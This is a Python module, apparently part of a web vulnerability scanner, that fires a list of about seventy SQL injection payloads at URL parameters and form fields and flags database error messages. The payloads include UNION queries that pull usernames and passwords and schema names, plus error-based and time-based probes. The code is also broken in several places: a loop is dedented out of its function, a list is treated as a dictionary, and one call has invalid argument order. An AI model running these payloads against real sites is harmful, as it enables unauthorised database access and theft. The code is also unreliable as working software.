from urllib.parse import urlsplit, urlencode, urlunsplit, parse_qs, urljoin
from utils import send_request
from bs4 import BeautifulSoup

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1/*",
    '" OR "1"="1',
    '" OR "1"="1" --',
    '" OR "1"="1" #',
    '" OR 1=1 --',
    '" OR 1=1 #',
    "or 1=1",
    "or 1=1 --",
    "or 1=1 #",
    "' OR ''='",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
    "') OR ('1'='1' #",
    "') OR 1=1 --",
    '") OR ("1"="1',
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1 LIMIT 1 --",
    "' OR 1=1 LIMIT 1 #",
    "1 OR 1=1",
    "1 OR 1=1 --",
    "1 OR 1=1 #",
    "1' OR '1'='1",
    "-1 OR 1=1",
    "-1' OR 1=1 --",
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL, NULL, NULL --",
    "' UNION SELECT username, password FROM users --",
    "' UNION SELECT table_name, NULL FROM information_schema.tables --",
    "' UNION SELECT column_name, NULL FROM information_schema.columns --",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
    "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1) --",
    "' AND 1=CAST((SELECT version()) AS INT) --",
    "' AND 1=CONVERT(INT, (SELECT @@version)) --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND 'a'='a' --",
    "' AND 'a'='b' --",
    "' AND SLEEP(5) --",
    "' AND SLEEP(5) #",
    "' OR SLEEP(5) --",
    "' OR SLEEP(5) #",
    "'; SELECT pg_sleep(5) --",
    "' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END) --",
    "' AND 1=(SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE 1 END) --",
    "' || pg_sleep(5) --",
    "' ORDER BY 1 --",
    "' ORDER BY 2 --",
    "' ORDER BY 3 --",
    "' ORDER BY 5 --",
    "' ORDER BY 10 --",
    "' ORDER BY 50 --",
    "' ORDER BY 100 --",
    "' oR 1=1 --",
    "' Or 1=1 --",
    "' AND @@hostname IS NOT NULL --",
    "' AND @@datadir IS NOT NULL --",
]

DB_ERROR_STRINGS = [
    "sql syntax",
    "mysql_fetch",
    "unclosed quotation",
    "sqlite3.operationalerror",
    "ora-01756",
    "pg_query",
    "warning: mysql",
]


def check_sqli(url, cookies=None):
    print("\n[+] Checking for SQL Injection")

    response = send_request(url, cookies=cookies)

    check_url_sqli(url, cookies)
    check_form_sqli(url, response, cookies)


def check_url_sqli(url, cookies=None):
    parsed_url = urlsplit(url)

    existing_params = parse_qs(parsed_url.query)

    if not existing_params:
        print("[+] No parameters found in the URL")
        return

for param_name in existing_params:
        for payload in SQLI_PAYLOADS:
            new_query = urlencode({param_name: payload})

            test_url = urlunsplit(
                (
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    new_query,
                    parsed_url.fragment,
                )
            )

            response = send_request(test_url, cookies=cookies)

            if response is None:
                print("[+] Skipping this URL")
                continue

            for error_string in DB_ERROR_STRINGS:
                if error_string.lower() in response.text.lower():
                    print(
                        f"[!] POTENTIAL SQLI — param: '{param_name}' | payload: {payload}"
                    )
                    print(f"URL: {test_url}")


def check_form_sqli(url, response, cookies=None):
    soup = BeautifulSoup(response.text, "html.parser")

    skip_types = {"submit", "button", "image", "reset"}

    forms = soup.find_all("form")

    for form in forms:
        action = form.get("action", response.url)
        action = urljoin(response.url, action)
        method = form.get("method", "GET").upper()

        input_dict = {}
        injectable_feilds = []

        inputs = form.find_all("input")

        for input_tag in inputs:
            input_name = input_tag.get("name")
            input_value = input_tag.get("value", "")
            input_type = input_tag.get("type", "text")

            if input_name:
                input_dict[input_name] = input_value

            if input_type not in skip_types and input_type != "hidden":
                injectable_feilds.append(input_name)

        if not injectable_feilds:
            continue

        for field_name in injectable_feilds:
            for payload_name, payload in SQLI_PAYLOADS.items():
                test_data = input_dict.copy()
                test_data[field_name] = payload

                if method == "POST":
                    form_response = send_request(action, method=method, test_data, cookies=cookies)

                if form_response is None:
                    continue

                for error_string in DB_ERROR_STRINGS:
                    if error_string.lower() in form_response.text.lower():
                        print(
                        f"[!] POTENTIAL SQL — form: '{action}' | field: '{field_name}' | payload: {payload_name}"
                    )
